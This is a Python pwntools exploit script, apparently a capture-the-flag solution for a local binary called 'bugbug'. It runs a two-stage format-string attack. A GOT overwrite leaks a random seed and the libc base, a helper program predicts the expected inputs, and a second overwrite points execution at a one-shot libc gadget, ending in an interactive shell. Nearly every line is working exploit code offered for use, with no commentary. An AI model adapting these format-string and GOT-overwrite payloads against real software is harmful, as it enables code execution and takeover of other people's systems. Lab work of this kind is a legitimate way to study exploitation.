from pwn import *
import subprocess

def randomNo(randomNumber):
	r = process(["./rand",str(randomNumber)])
	r.recvline()[:-1]
	payload = ""
	payload += r.recvline()[:-1] + " "
	payload += r.recvline()[:-1] + " "
	payload += r.recvline()[:-1] + " "
	payload += r.recvline()[:-1] + " "
	payload += r.recvline()[:-1] + " "
	payload += r.recvline()[:-1] + " "

	payload2 =""
	payload2 += r.recvline()[:-1] + " "
        payload2 += r.recvline()[:-1] + " "
        payload2 += r.recvline()[:-1] + " "
        payload2 += r.recvline()[:-1] + " "
        payload2 += r.recvline()[:-1] + " "
        payload2 += r.recvline()[:-1] + " "
	r.close()
	return [payload,payload2]

p = process("./bugbug")
context.clear(arch='i386')

# first overwirte : For leaking libc base
fm=fmtstr_payload(17,{0x0804a024:0x08048843},write_size='byte')
payload = ""
payload+=fm
payload+="a"*(0x64-len(payload))

p.recv()
p.sendline(payload)
p.recvuntil(payload)
leaked = p.recv()
randomNumber = u32(leaked[0:4])
libcbase = u32(leaked[8:12])-(0xf76c53dc-0xf7513000)

log.info("random no : "+str(randomNumber))
log.info("libc base : "+hex(libcbase))

payload,payload2 = randomNo(randomNumber)
p.sendline(payload)
print p.recv()


# second overwrite : exploit
oneshot = libcbase+0x5fbc6
log.info("one-shot gadget : " +hex(oneshot))
fm=fmtstr_payload(19,{0x0804a024:oneshot},write_size='byte')
payload = ""
payload+=fm
payload+="a"*(0x64-len(payload))

p.sendline(payload)
p.recv()
p.sendline(payload2)
p.interactive()
